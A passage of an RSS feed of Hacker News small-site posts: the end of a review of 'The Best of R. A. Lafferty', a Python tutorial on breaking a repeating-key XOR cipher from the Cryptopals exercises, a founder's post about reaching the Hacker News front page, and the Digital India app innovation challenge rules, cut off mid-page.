<p>Lafferty stories are immediately identifiable by his unique voice. So much of what makes these stories wonderful is in how they are told. Lafferty’s default style is that of the tall tale or shaggy dog story, and his fascination and love of stories leads to him playing various games with narrative convention. Nested stories – or stories nested within stories nested within stories – are common, as are puns and wordplay, frequently across various languages. ‘The Primary Education of the Camiroi’ is written as a school curriculum for alien children. Stories are frequently set up around a silly punchline, and are peppered with witty one-liners. The stories brim over with a love of language and storytelling, and the sheer joy of how these can be played with and rearranged in surprising new forms. However just because jokes and humour are an essential part of Lafferty’s toolbox does not mean that the stories are flippant or slight. At heart, Lafferty is interested in perspective, and how who is telling the story alters the perspective, and the best of his stories allow us to look at the familiar world around us in a new and unsettling way.</p>
<p>Many of Lafferty’s stories manage to take utterly bizarre, gonzo speculative fiction ideas and run with them, part of the fun being to take a ridiculous idea at face value to really see what it means. ‘Slow Tuesday Night’ imagines a world in which humanity’s perception has been sped up, to the extent that entire cultural movements and business careers rise and fall multiple times over the course of a single night. The story is breathtakingly fun, but also has a serious point to make about dwindling attention spans and the speed of modern life, anxieties that users of the internet will easily recognize. ‘Selenium Ghosts of the Eighteen Seventies’ reimagines the early days of television, where the programmes are given increased emotional resonance and depth every time they are watched, playing with the idea of how we imprint our emotions on the mass media we consume. ‘Thus We Frustrate Charlemagne’ takes the science fiction staple of using time travel to meddle with the past and so alter the future and takes it in unexpected and hilarious directions. The story is built around the pun of cutting one’s own throat with Ockham’s razor, which it uses to explore ideas around determinism and free will. Lafferty takes us through unexpected turning points in history, and wryly questions science fiction’s love of magical solutions to technologically framed problems. As such it is a pretty good example of his wayward genius at its best.</p>
<p>Lafferty had a fascination with Native American traditions and culture, and was aware of how the land of his native Oklahoma was taken from them. Many of his most powerful and devastating stories engage directly with colonialism and dispossession of native peoples. In ‘Narrow Valley’, a member of the Pawnee tribe manages to avoid having his land taken by the US government by geographically folding a valley so that it only appears five feet wide. ‘Land of the Great Horses’ sees the land of the Roma, which has been physically taken off the planet by alien powers, returned to them, whilst Los Angeles is removed and its people left to wander the Earth. ‘Ride a Tin Can’ explores the colonialist attitude at the heart of anthropological studies, and shows us the heart-breaking consequences of a people being denied their status as human. Other stories such as ‘Thieving Bear Planet’ and ‘Nine-Hundred Grandmothers’ explore situations where contact with alien beings goes horribly wrong because of the baggage and preconceptions the humans bring with them. These stories demonstrate that Lafferty’s humour and playfulness does not obscure his awareness of the darker side of human nature, that his love of America is tempered by his understanding of the tragic legacy of colonialism.</p>
<p>Many of Lafferty’s stories deal with folded realities, the idea that just underneath the world we know is a world more vital and strange, a realm of myth and imagination that informs the waking world. This is evident in ‘Boomer Flats’, in which a group of scientists on the hunt for the Abominable Snowman unwittingly enter a mythic realm and become part of the legend themselves. ‘The World as Will and Wallpaper’ anticipates the New Weird by imagining a world-engulfing city not just inspired by William Morris’s political ideals but geographically recursive like his iconic wallpaper designs. ‘Days of Grass, Days of Straw’ is about the secret days that do not fall on the calendar, when life is more vivid and colourful and bloody. Although any character’s attempts at trying to navigate these overlapping worlds is unlikely to be successful. Ceran Swicegood’s quest for knowledge about the origins of the universe in ‘Nine-Hundred Grandmothers’ is a joke he can never share in, whilst the three disappearing soldiers in ‘Cliffs That Laughed’ escape the siren’s call only to be dragged back in again. Jim Boomer and Art Slick give up trying to figure out how the people from ‘In Our Block’ achieve their impossible tasks and go to the pub instead. Transcendence most definitely exists in Lafferty’s stories, but it does not come easily, nor does it necessarily provide the answer the characters would like to hear.</p>
<p><em>The Best of R. A. Lafferty</em> is a wonderful introduction to Lafferty’s singular writing, and an excellent addition to the SF Masterworks series. It celebrates the work of one of the genre’s true originals, and hopefully, the endorsement of so many other wonderful writers throughout will lead more readers to discover Lafferty’s work. My only issue with it is that I’m somewhat at a loss now that it’s over. Most of Lafferty’s work remains out of print and his short story collections can command excessive prices over the internet. I very much hope that any publishers reading this will bring more of his stories back into print as soon as possible, as I am now thoroughly addicted and need my Lafferty fix.</p>

<p id="jp-relatedposts">
	<h3><em>Related</em></h3>
</p>                                                            </div></div>]]>
            </description>
            <link>https://fantasy-hive.co.uk/2020/05/the-best-of/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23736876</guid>
            <pubDate>Sun, 05 Jul 2020 05:51:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deciphering Repeated-Key XOR Ciphertexts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23736681">thread link</a>) | @arpitbbhayani
<br/>
July 4, 2020 | https://arpitbhayani.me/blogs/decipher-repeated-key-xor | <a href="https://web.archive.org/web/*/https://arpitbhayani.me/blogs/decipher-repeated-key-xor">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Encryption is a process of encoding messages such that it can only be read and understood by the intended parties. The process of extracting the original message from an encrypted one is called Decryption. Encryption usually scrambles the original message using a key, called the encryption key, that the involved parties agree on.</p>
<p>In the previous essay, we went through the <a href="https://arpitbhayani.me/blogs/decipher-single-xor">Single-byte XOR cipher</a> and found a way to decipher it without having any knowledge of the encryption key. In this essay, we find how to break a <a href="https://en.wikipedia.org/wiki/XOR_cipher">Repeating-key XOR cipher</a> with variable key length. The problem statement, defined above, is based on <a href="https://cryptopals.com/sets/1/challenges/6">Cryptopals Set 1 Challenge 6</a>.</p>

<p>The Repeating-key XOR cipher algorithm works with an encryption key with no constraint on its length, which makes it much stronger than a Single-byte XOR Cipher, where the encryption key length was restricted to a single byte.</p>
<h2>Encryption</h2>
<p>A plain text is encrypted using an encryption key by performing a bitwise <a href="https://en.wikipedia.org/wiki/Exclusive_or">XOR</a> operation on every character. The encryption key is repeated until it XORs every single character of the plain text and the resultant stream of bytes is again translated back as characters and sent to the other party. These encrypted bytes need not be among the usual printable characters and should ideally be interpreted as a stream of bytes. Following is the python-based implementation of this encryption process.</p>
<pre><code><span><span>def</span> <span>repeating_key_xor</span><span>(text: bytes, key: bytes)</span> -&gt; bytes:</span>
    <span>"""Given a plain text `text` as bytes and an encryption key `key`
    as bytes, the function encrypts the text by performing
    XOR of all the bytes and the `key` (in repeated manner) and returns
    the resultant XORed byte stream.
    """</span>
    
    
    
    repetitions = <span>1</span> + (len(text) // len(key))
    key = key * repetitions
    key = key[:len(text)]

    
    <span>return</span> bytes([b ^ k <span>for</span> b, k <span>in</span> zip(text, key)])
</code></pre>
<p>As an example, we encrypt the plain text - <code>secretattack</code> - with encryption key <code>$^!</code> and as per the algorithm, we first repeat the encryption key until it matches the length of the plain text and then XOR it against the plain text. The illustration below shows the entire encryption process.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/85919742-d1520600-b88b-11ea-8d71-aa36c58dc48a.png" alt="https://user-images.githubusercontent.com/4745789/85919742-d1520600-b88b-11ea-8d71-aa36c58dc48a.png"></p>
<p>For the first character in plain text - <code>s</code> - the byte i.e. ASCII value is <code>115</code> which when XORed with <code>$</code> results in <code>87</code> whose character equivalent is <code>W</code>, similarly for the second character <code>e</code> the encrypted byte is <code>;</code>, for <code>c</code> it is <code>B</code>, for the fourth character <code>r</code>, since the key repeats, the XOR is taken with <code>$</code> to get <code>V</code> and the process continues. The resultant encrypted text using repeated-key XOR on the plain text <code>secretattack</code> with key <code>$^!</code> is <code>W;BV;UE*UE=J</code>.</p>
<h2>Decryption</h2>
<p>Decryption is a process of extracting the original message from the encrypted ciphertext given the encryption key. XOR has a <a href="https://brainly.in/question/3038497">property</a> - if <code>a = b ^ c</code> then <code>b = a ^ c</code>, hence the decryption process is exactly the same as the encryption i.e. we first repeat the encryption key till it matches the length and then perform bitwise XOR with the ciphertext - the resultant bytes stream will be the original message.</p>
<p>Since encryption and decryption both have an exact same implementation - we pass the ciphertext to the function <code>repeating_key_xor</code>, defined above, to get the original message back.</p>
<pre><code><span>&gt;&gt;&gt; </span>repeating_key_xor(<span>b'W;BV;UE*UE=J'</span>, <span>b'$^!'</span>)
<span>b'secretattack'</span>
</code></pre>

<p>Things become really interesting when, given the encryption algorithm, we have to recover the original message from the ciphertext with no knowledge of the encryption key. Just like solving any other problem, the crux of deciphering the message encrypted using repeated-key XOR cipher is to break it down into manageable sub-problems and tackle them independently. We break this deciphering problem into the following two sub-problems:</p>
<ul>
<li>Finding the length of the Encryption Key</li>
<li>Bruteforce with all possible keys and finding the "most English" plain text</li>
</ul>
<h2>Finding the length of the Encryption Key</h2>
<p>In order to recover the original text from the cipher, we first find the length of the encryption key used and then apply brute force with all possible keys of the estimated length and deduce the plain text. Finding the length of the Encryption key makes the deciphering process quicker as it eliminates a lot of false keys and thus reducing the overall effort required during the brute force. In order to find the length of the Encryption Key, we need to have a better understanding of a seemingly unrelated topic - Hamming Distance.</p>
<h3>Hamming Distance</h3>
<p>Hamming distance between two bytes is the number of positions at which the corresponding bits differ. For a stream of bytes, of equal lengths, it is the sum of Hamming Distances between the corresponding bytes. Finding differences between bits can be efficiently done using bitwise XOR operation as the operation yields <code>0</code> when both the bits are the same and <code>1</code> when they differ. So for computing Hamming Distance between two bytes we XOR the bytes and count the number of <code>1</code> in its binary representation.</p>
<pre><code><span><span>def</span> <span>hamming_distance_bytes</span><span>(text1: bytes, text2: bytes)</span> -&gt; int:</span>
    <span>"""Given two stream of bytes, the function returns the Hamming Distance
    between the two.
    Note: If the two texts have unequal lengths, the hamming distance is
    computed only till one of the text exhausts, other bytes are not iterated.
    """</span>
    dist = <span>0</span>
    <span>for</span> byte1, byte2 <span>in</span> zip(text1, text2):
        dist += bin(byte1 ^ byte2).count(<span>'1'</span>)
    <span>return</span> dist

<span>&gt;&gt;&gt; </span>hamming_distance_bytes(<span>b'ab'</span>, <span>b'zb'</span>)
<span>4</span>
</code></pre>
<p>In the example above, we find that the hamming distance between two bytestreams <code>ab</code> and <code>zb</code> is <code>4</code>, which implies that the byte streams <code>ab</code> and <code>zb</code> differ at <code>4</code> different bits in their binary representations.</p>
<h3>Hamming Score</h3>
<p>Hamming distance is an absolute measure, hence in order to compare hamming distance across byte streams of varying lengths, it has to be normalized with the number of pairs of bits compared. We name this measure - Hamming Score - which thus is defined as the Hamming Distance per unit bit-pair. In python, Hamming Score is implemented as:</p>
<pre><code><span><span>def</span> <span>hamming_score_bytes</span><span>(text1: bytes, text2: bytes)</span> -&gt; float:</span>
    <span>"""Given two streams of bytes, the function computes a normalized Hamming
    Score based on the Hamming distance.
    Normalization is done by dividing the Hamming Distance by the number of bits
    present in the shorter text.
    """</span>
    <span>return</span> hamming_distance_bytes(text1, text2) / (<span>8</span> * min(len(text1), len(text2)))

<span>&gt;&gt;&gt; </span>hamming_score_bytes(<span>b'ab'</span>, <span>b'zb'</span>)
<span>0.25</span>
</code></pre>
<h3>What can we infer through Hamming Distance?</h3>
<p>Hamming Distance is an interesting measure; it effectively tells us the minimum number of bit flips required to convert one bytestream into another. It also implies that (on average) if the numerical values of two bytestreams are closer then their Hamming Distance and Hamming Score will be lower i.e it would take fewer bit flips to convert one into another.</p>
<p>This is evident from the fact that the average Hamming distance between any two bytes <code>[0-256)</code> picked at random is <code>3.9999</code> while that of any two lowercased English characters <code>[97, 122]</code> is just <code>2.45</code>. Similar ratios are observed for Hamming Score where <code>0.4999</code> is of the former while <code>0.3072</code> is of the later.</p>
<p>This inference comes in handy when we want to find out the length of Encryption Key in Repeating-key XOR Cipher as illustrated in the section below.</p>
<h3>Formal definition of encryption and decryption processes</h3>
<p>Say if <code>p</code> denotes the plaintext, <code>k</code> denotes the encryption key which is repeated to match the length of the plain text, and <code>c</code> denotes the ciphertext, we could define encryption and decryption processes as</p>
<pre><code>encryption: c[i] = p[i] XOR k[i]   <span>for</span> i <span>in</span> [<span>0</span>, len(c))
decryption: p[i] = c[i] XOR k[i]   <span>for</span> i <span>in</span> [<span>0</span>, len(p))
</code></pre>
<p>The above definitions, along with the rules of XOR operations, implying that if we XOR two bytes of the ciphertext, encrypted (XORed) using the same byte of the encryption key, we are effectively XORing the corresponding bytes of the plain text. If <code>k'</code> is the byte of the encryption key <code>k</code> which was used to encrypt (XOR) the bytes <code>p[i]</code> and <code>p[j]</code> of the plain text to generate <code>c[i]</code> and <code>c[j]</code> of the ciphertext, we could derive the following relation</p>
<pre><code># k' <span>is</span> the common byte <span>of</span> the key i.e. k' = k = k

c XOR c = (p XOR k') XOR (p XOR k')
              = p XOR k' XOR k' XOR p
              = p XOR 0 XOR p
              = p XOR p
</code></pre>
<p>The above relation, <code>c[i] XOR c[j]</code> equal to <code>p[i] XOR p[j]</code>, holds true only because both the bytes were XORed with the same byte <code>k'</code> of the encryption key; which in fact helped reduce the expression. If the byte from the encryption key which was used to XOR the pain texts were different then the relation was irreducible and we could not have possibly setup this relation.</p>
<h3>Chunking of ciphertext</h3>
<p>Chunking is the process where the ciphertext is split into smaller chunks (segments) of almost equal lengths. For example, chunking the ciphertext <code>W;BV;UE*UE=J</code> for chunk length <code>4</code> would create <code>3</code> chunks <code>W;BV</code>, <code>;UE*</code> and <code>UE=J</code>. The illustration below shows the chunks that would be formed for <code>W;BV;UE*UE=J</code> with chunks lengths varying from 2 to 6.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/86434084-24a7d680-bd1a-11ea-8346-aad7b42bab1c.png" alt="https://user-images.githubusercontent.com/4745789/86434084-24a7d680-bd1a-11ea-8346-aad7b42bab1c.png"></p>
<h3>XOR of the chunks</h3>
<p>Something very interesting happens when we compute the Average Hamming Score for all possible chunk lengths. If we consider the ciphertext <code>b'W;BV;UE*UE=J</code> and we chunk it with lengths varying from 2 to 6, we get the following distribution for the Average Hamming Score for each of the chunk length.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/86473899-6149f100-bd5f-11ea-908a-d4adabff1cf0.png" alt="https://user-images.githubusercontent.com/4745789/86473899-6149f100-bd5f-11ea-908a-d4adabff1cf0.png"></p>
<p>From the distribution above it is evident that the score was minimum at chunk length equalling <code>3</code>, which actually was the length of the Encryption Key used on the plain text. Is this mere coincidence or are we onto something?</p>
<p>When chunk length is equal to the length of the encryption key, the XOR operation on any two chunks will reduce the expression to XOR of the corresponding plain texts (as seen above), because there will be a perfect alignment of bytes from ciphertext and bytes from the keys i.e every <code>i</code>th byte from both the chunks would have been XORed with <code>i</code>th byte from the encryption key.</p>
<p>We have established that for chunk length equal to the length of the encryption key <code>c[i] XOR c[j]</code> …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://arpitbhayani.me/blogs/decipher-repeated-key-xor">https://arpitbhayani.me/blogs/decipher-repeated-key-xor</a></em></p>]]>
            </description>
            <link>https://arpitbhayani.me/blogs/decipher-repeated-key-xor</link>
            <guid isPermaLink="false">hacker-news-small-sites-23736681</guid>
            <pubDate>Sun, 05 Jul 2020 04:55:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My post was #3 on Hacker News]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23736656">thread link</a>) | @root993
<br/>
July 4, 2020 | https://www.sankalpjonna.com/posts/my-post-was-3-on-hacker-news | <a href="https://web.archive.org/web/*/https://www.sankalpjonna.com/posts/my-post-was-3-on-hacker-news">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last Sunday I published a piece of content for the very first time on hacker news and it ended up getting the #3 spot for a few hours and stayed on the front page for an <a href="https://news.ycombinator.com/front?day=2020-06-28" target="_blank">entire day.</a> The post was about <a href="https://www.sankalpjonna.com/posts/our-aws-bill-is-2-of-revenue-heres-how-we-did-it" target="_blank">how we managed to get our AWS bill to &lt; 2% of our revenue</a>.</p><figure id="w-node-70cd5a19b74c-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015791310d7d85125fef6b_O4P4rEPlKnx7Ng3ZdLmcl81BEdrR4uXkGzmWUwvFM9Ibl9UOF87Zi-4gIjv0F0MdYcbPlL0q_q3RiCywpMppiPUTyLqgVMoR6idh7sVNCR5LiPyWnYgf02BdaG1GBh6C6aenbS3H.png" alt=""></p><figcaption>Hacker News front page</figcaption></figure><p>This was a super thrilling experience for me because I have been a reader of Hacker news for a while but never actually posted anything or even created an account. This is why I had to ask my co-founder <a href="https://twitter.com/hipreetam93" target="_blank">Preetam</a> to post on my behalf as I did not have enough Karma points to even make one post!</p><p>‍</p><p>So I decided to continue this feedback loop of <strong>writing -&gt; being recognized -&gt; writing some more as a result</strong> by talking about what went into writing this post and what were the consequences of being featured on Hacker news.&nbsp;</p><p>‍</p><div><p>There were 3 primary reasons for this post&nbsp;</p></div><ol role="list"><li>Taking the first step at making a series of posts explaining how we solved various problems while building our <a href="https://apps.shopify.com/whatsapp-chat-button" target="_blank">WhatsApp Shopify app</a>. Problems that other indie hackers can relate to and hopefully not reinvent the wheel while solving them. We were hesitant to do this at first because we were afraid of competitors reading these posts and copying our strategies, but we realised recently that what we stand to gain from making a place for ourselves in this community outweighs the risk of competitors giving us trouble.</li></ol><ol start="2" role="list"><li>We plan to build more of such products in the future and It became very clear to us that we have to build our own distribution channels to get users instead of relying on a 3rd party channel like the Shopify App Store which we currently rely on to get 100% of our users. This post was the first attempt to drive some traffic to my personal blog, traffic that we can hopefully use to get the initial customers for our next venture.</li></ol><ol start="3" role="list"><li>An attempt to heal my imposter syndrome which kept holding me back over the years and prevented me from voicing my thoughts in public due to the fear of getting criticised. When I read all the negative comments to my post I realised that negative comments do not necessarily come from a negative place and the people posting such comments are just trying to voice their thoughts based on the unique situations that they deal with on a day to day basis. This means that criticism is very essential for growth</li></ol><p>‍</p><p><strong>Power of Hacker news and Reddit</strong>‍</p><p>‍</p><p>I posted this piece on<a href="http://reddit.com/r/Entrepreneur/" target="_blank"> reddit.com/r/Entrepreneur/</a> and Hacker news and at the time of making the post it did not occur to me that I should track the users that are visiting my blog as a result of these posts even though that was one of the primary intentions behind the post.&nbsp;</p><p>‍</p><p>I finished writing and publishing the post and went offline for a few hours when my co-founder <a href="https://twitter.com/hipreetam93" target="_blank">Preetam</a> texts me saying my post is on the front-page and I should add Google Analytics to my blog ASAP if I have not done it already. I quickly do so and start seeing results immediately&nbsp;</p><figure id="w-node-0de8a57abe57-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015791594ffa6c974ece60_UPCnJKN5cQEljrF22coESNJOE3d7jZwgWNP8xLEkih0T_y5oR0-zYbdVHPN-Lh7ieejS0qmnWW9y2MFDkuo_n71O_zbIs5vZIZ5xAg1IDNaWT0YHP7BPJtgzhIVfwSp3bcWWLjLV.png" alt=""></p><figcaption>Google analytics data</figcaption></figure><p>‍</p><p>As you can see I got ~14k visits on my blog the day I posted it and since I added GA a few hours late, I am assuming I got around 20k or more visits. This was mind blowing to me.&nbsp;</p><figure id="w-node-de58744503f8-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f0157926dc9fcea598afa19_eXlhXdTDtdZx3rEncGgJrkkYR2XtySsWwjIR8Hof3N5RTJ3Gzblq7VaMfy1kmCjZRclUl8er-rEhvWx81p7bV632AI_TzADpLSPv1eGFFPLBbSgWAAZHzW9_ALR0AOgxlsyai-qY.png" alt=""></p><figcaption>Google analytics data</figcaption></figure><p>Looking into the data further it is quite clear that most of the traffic came from Hacker news. The fact that I had access to this kind of traffic and all I had to do was write about something that I myself experienced has given me a new perspective that is backed by actual numbers and graphs. We have all heard people tell us that it is important to write, but this can clearly be backed with actual numbers.&nbsp;</p><p>A few more things happened as a result of this post. I gained some new twitter followers, had engaging conversations with some of them and somebody even suggested that I add an RSS feed to my site so that they can follow my blog easily.&nbsp;</p><figure id="w-node-7aef82240888-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015792e08dc7f5ad78f64b_dzsKkucLoEIlELWuS-2wMH3FsDPvL0abSgho2aEkTvihuHdoD0d7GTGBPtBrn0cEOhOtqs_csRmKdv9VK0GSkacNfALtQr4ByN0nA5S930229eCXsYaZ12_n6ZSAcuGtiHzNkPUY.png" alt=""></p><figcaption>Good folks of twitter helping me out</figcaption></figure><p>For someone who started writing for the first time, seeing so much visible evidence of the benefits of writing has certainly done a lot to fuel my desire to write even more. I am yet to discover what this means in the long run when the post matures enough to start ranking on google search.</p><p><strong>Learnings from people who read the post</strong>‍</p><p>‍</p><p>Here is a TLDR for folks who have not read the post: Use Lightsail, Amazon's approximation of a dedicated server.</p><p>The post highlighted how we managed to save a lot on AWS bills in exchange for sacrificing a bit of resilience and some folks did not take kindly to this fact.</p><figure id="w-node-48d76d4377b1-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015792e830705462abc486_Zrrh_CUjp34hKeGUfsUwkFrV0E-eYtWOr3JnnzrAX-cPIl9K3BtiXxWnH_-m96m42GPnuxNAyfN_ohXlJBW-1K6eWwqNRxWK6oZgzN18fIdE1ouGAb5iKfMrM3LNIK6JjBzu2UdM.png" alt=""></p><figcaption>Harsh comment from a redditor</figcaption></figure><p>When I set up my app on AWS, it did not occur to me that Redundancy was super important. This is because we had the ability to do point in time restores of the Database and launch a new instance in case a disaster ever stuck, but what I failed to consider was the fact that sometimes an entire region in AWS can go dark in which case we won’t have the ability to do a restoration from a backup if that backup is on a region that is down. This is something that I have duly noted and will take into account going forward.</p><p>The above comment though harsh was a useful learning for me which would probably help me in the future but there were also comments that were not going to help anybody at all and my learnings from those comments was to not let them affect you. Find the feedback that will be useful in the long run and ignore the rest. The rest is just noise.</p><p>There were also many positive comments from people who found the post helpful and someone even commented that they moved all their instances to Lightsail after reading my post. There were people who appreciated the fact that I put a disclaimer at the end of my post explicitly saying that this is not a holy grail solution that will work for everyone and it is just something that worked for us.&nbsp;</p><p>Overall the learnings were all net positive and I look forward to sharing more and learning even more from the comments of all my future posts.</p><p><strong>Closing note</strong>‍</p><p>‍</p><p>I would like to conclude by encouraging anyone wanting to share their experiences to write and not be afraid to post it in public because it is totally worth it. You get some validation and you also get criticized but you will certainly find out that even after getting criticized, you are still alive and life goes on.</p></div></div>]]>
            </description>
            <link>https://www.sankalpjonna.com/posts/my-post-was-3-on-hacker-news</link>
            <guid isPermaLink="false">hacker-news-small-sites-23736656</guid>
            <pubDate>Sun, 05 Jul 2020 04:46:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital India App Innovation Challenge]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23736349">thread link</a>) | @rainhacker
<br/>
July 4, 2020 | https://innovate.mygov.in/app-challenge/ | <a href="https://web.archive.org/web/*/https://innovate.mygov.in/app-challenge/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <div>
      <div id="tab1">
        <h3>Background</h3>
		<p>MeitY in partnership with Atal Innovation Mission – Niti Aayog launches <strong>Digital India AatmaNirbhar Bharat Innovate Challenge</strong>  to identify the best Indian Apps that are already being used by citizens and have the potential to scale and become world class Apps in their respective categories. This Innovation Challenge with various cash awards and incentives of featuring Apps on Leader Boards seeks to create an ecosystem where Indian entrepreneurs and Startups are incentivised to ideate, incubate, build, nurture and sustain Tech solutions that can serve not only citizens within India but also the world. 
		</p>
		<p>The Mantra is to Make in India for India and the World.  </p>
		
       <p>The AatmaNirbhar Bharat App Innovation Challenge is being launched in the following 8 broad categories:</p>
        <ul>
        <li>Office Productivity &amp; Work from Home</li>
        <li>Social Networking</li>
        <li>E-Learning</li>
        <li>Entertainment</li>
        <li>Health &amp; Wellness</li>
        <li>Business including Agritech and Fintech</li>
        <li>News </li>
        <li>Games</li>

        </ul>
		<p>There may be several sub categories within each category.</p>
		
		<h3>Indicative List of Sub Categories and Problem Statements</h3>
        
        <ul>
          <li>A mobile application harnessing the most accurate facial and / or body mapping technology to allow for a true-to-life virtual try out of products like spectacles, clothes, etc.</li>
<li>Mobile application for real-time speech-to-speech translation and camera translation of multiple languages.</li>
<li>An automated web-based application that handles business-to-business lead generation and cold emailing and is completely manageable from a mobile device itself.</li>
<li>Application to use mobile devices as image scanners with features like on the fly image correction, image editing, text recognition, etc.</li>
<li>Application to provide cloud storage integration, cross-platform file transfer via FTP or LAN, and a root browser on mobile device </li>
<li>A robust indigenous anti-virus software for mobile devices.</li>
<li>Application to optimize mobile device's performance by cleaning junk/cache files, optimizing device memory and optimizing battery usage.</li>
<li>A mobile based live streaming platform for hosting webinars, lectures, etc.</li>
<li>A mobile based messaging and video calling application</li>
<li>A mobile based microblogging application</li>
<li>A mobile based news application that uses cutting-edge technology to recommend the most relevant and interesting news individually to each use.</li>
<li>A mobile application offering satellite imagery and street maps, as well as functions such as a route planner for traveling by foot, car, or with public transportation. </li>
<li>A mobile based online gaming platform which also functions as a social hub for gamers</li>
<li>A mobile based photo-editing application with all standard image editing features</li>

		</ul>
		
      </div>
      <div id="tab2">
		<h3>ELIGIBILITY CRITERIA</h3>
        <p>Only Indian entrepreneurs and start-ups will be eligible to submit their entries in various categories</p>
        
		
        <h3>INNOVATION CHALLENGE PROCESS</h3>
        
        <ul>
          <li>The Innovation Challenge will be available on <a href="https://innovate.mygov.in/" target="_blank">innovate.mygov.in</a></li>
		  <li>The last date of submission of entry is 18th July 2020</li>
		  <li>The applicant needs to apply only online to submit their proposals by registering and logging on MyGov portal: <a href="https://www.mygov.in/" target="_blank">www.mygov.in</a></li>
		  <li>Applicants are advised to provide self-contained proposals with essential supporting materials provided as uploads for an informed and fair evaluation/review.</li>
		  <li>No changes will be accepted once proposals are submitted.</li>
		  <li>Providing incorrect information will lead to outright rejection of proposals.</li>
		</ul>
		
		<h3>Evaluation parameters</h3>
			<ul>
				<li>Ease of use</li>
				<li>Robustness</li>
				<li>Security features</li>
				<li>Scalability </li>
			</ul>
		<p>There will be a two stage Selection Process:</p>
			<ul>
				<li>1st Stage - Screening of eligible entries</li>
				<li>2nd Stage - Evaluation by Jury, with actual Demo</li>
			</ul>
		
		<h3>SELECTION PROCESS</h3>
			<ul>
				<li>Jury with experts from Private Sector &amp; Academia to Evaluate</li>
				<li>Shortlisted Apps to be awarded &amp; put on Leader boards</li>
				<li>Government to adopt suitable Apps, guide them to maturity</li>
			</ul>
		
		
      </div>
		<div id="tab3">
			<h3>IMPORTANT DATES</h3>
			<div>
				<table>
				<tbody><tr><td>Launch of Innovation Challenge:</td><td> 4th July 2020, on <a href="https://innovate.mygov.in/" target="_blank">innovate.mygov.in</a></td></tr>
				<tr><td>Last date for Submission: </td><td>18th July 2020 at 5:30 P.M</td></tr>
				<tr><td>Screening of Entries Received </td><td>20th to 24th July 2020</td></tr>
				<tr><td>Evaluation by the Jury </td><td>27th July to 3rd August  2020</td></tr>
				<tr><td>Final Announcement </td><td>7th August, 2020</td></tr>
				</tbody></table>
			</div>
		</div>
		
		<div id="tab4">
     <h3>AWARDS </h3>
     <p>Following Awards will be given in each of the Eight Categories</p>
     <div>
     <table>
     <tbody><tr><td>First Prize</td><td>20 Lakhs</td></tr>
     <tr><td>Second Prize </td><td>15 Lakhs</td></tr>
     <tr><td>Third Prize </td><td>10 Lakhs</td></tr>
     
     </tbody></table>
     </div>
     <p>For the purposes of evaluation, Jury may create sub categories in each category and then Apps will be classified into respective subcategories, based on functionality and evaluated. In case Sub Categories are created, the Prize Money for each sub category within each category will be as below:</p>
     <div>
     <table>
     <tbody><tr><td>First Prize</td><td>5 Lakhs</td></tr>
     <tr><td>Second Prize </td><td>3 Lakhs</td></tr>
     <tr><td>Third Prize </td><td>2 Lakhs</td></tr>
     </tbody></table>
     </div>
	
   
   </div>
		
     
      <div id="tab5">
      <h3>TERMS AND CONDITIONS </h3>
      <ul>
        <li>The contest is open to Indian  Citizens only.&nbsp;</li>
        <li>The decision of the Ministry of  Electronics and IT (MeitY) will be final and binding with regard to selection  on all stages.&nbsp;</li>
        <li>By making a submission in the  contest, all participants warrant and represent that to the best of their  knowledge, their submission is original and does not violate or misappropriate  any third party trade secret, “know-how,” copyright, patent or other  intellectual property right. Participants also warrant and represent that there  are no obligations of any nature, legal or otherwise, which would prohibit,  restrict, or interfere with their participation in the Contest or submission of  their design report, and agree to obtain any necessary clearances,  authorizations and/or approvals prior to participation.</li>
        <li>The participants agree that&nbsp;  MeitY will share information submitted by the participants as to panel experts,  reviewers etc. (any information that you may not want to share publicly should  not be submitted).</li>
		
		<li>Government does not claim ownership over Intellectual Property Right (IPR) for the Innovation that is sent to us by submitting an application. The IPR shall remain with the applicant at all times.</li>
		<li>Government reserves the right to publish the grantees information with regard to Name of the App , Brief summary, Key Functionalities , Developer Contact , Team details.</li>
	    
        <li>By entering the Contest, each  participant agrees to release&nbsp; MeitY from and against any losses, damages,  rights, claims and actions of any kind arising from&nbsp;
        <ul>
          <li>an  exclusion or disqualification of such participant pursuant to these  rules;&nbsp;</li>
          <li>late  or unsuccessful efforts to notify winners of any prize;&nbsp;</li>
          <li>forfeiture  of a prize and the selection of an alternate winner;&nbsp;</li>
          <li>late,  lost, delayed, damaged, misdirected, incomplete, illegible or unintelligible  entries;</li>
          <li>telephone,  electronic, hardware or software program, network, Internet, or computer  malfunctions, failures or difficulties of any kind;</li>
          <li>failed,  incomplete, garbled or delayed computer transmissions;</li>
          <li>any  condition caused by events beyond MeitY’s control that may cause the Contest to  be disrupted or corrupted; and</li>
          <li>any  injuries, losses or damages of any kind relating to participation in this  Contest.</li>
        </ul>
        </li>
      </ul>
	  <li>Government reserves the right, at its sole discretion, to cancel, terminate, suspend this contest and modify the rules, prizes &amp; funding related to the contest without prior notice. In no event shall Government or any other organizers be liable for any claims, losses, expenses or damages, arising out of or in connection with the foregoing.</li>
	  
	  <h3>CORRESPONDENCE</h3>
        <ul>
